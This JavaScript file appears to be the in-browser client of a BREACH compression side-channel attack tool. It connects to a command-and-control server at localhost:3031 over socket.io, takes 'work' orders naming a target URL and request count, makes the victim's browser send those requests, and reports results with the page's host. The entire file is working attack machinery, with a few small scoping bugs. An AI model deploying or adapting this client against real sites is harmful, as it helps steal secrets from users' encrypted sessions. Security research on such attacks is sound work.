const io = require('socket.io-client'),
      req = require('./request.js');

var BREACHClient = {
    COMMAND_CONTROL_URL: 'http://localhost:3031/',
    ONE_REQUEST_TIMEOUT: 5000,
    MORE_WORK_TIMEOUT: 10000,
    _socket: null,
    init() {
        this._socket = io.connect(this.COMMAND_CONTROL_URL);
        this._socket.on('connect', () => {
            console.log('Connected');
        });
        this._socket.on('do-work', (work) => {
            console.log('do-work message');
            this.doWork(work);
        });
        this.getWork();
        console.log('Initialized');
    },
    noWork() {
        console.log('No work');
        setTimeout(this.getWork, MORE_WORK_TIMEOUT);
    },
    doWork(work) {
        var {url, amount} = work;

        // TODO: rate limiting
        if (typeof url == 'undefined') {
            noWork();
            return;
        }
        console.log('Got work: ', work);

        const reportCompletion = (success) => {
            if (success) {
                console.log('Reporting work-completed to server');
            }
            else {
                console.log('Reporting work-completed FAILURE to server');
            }

            this._socket.emit('work-completed', {
                work: work,
                success: success,
                host: window.location.host
            });
        }
        req.Collection.create(
            url,
            {amount: amount},
            function() {},
            reportCompletion.bind(this, true),
            reportCompletion.bind(this, false)
        );
    },
    getWork() {
        console.log('Getting work');
        this._socket.emit('get-work');
    }
};

BREACHClient.init();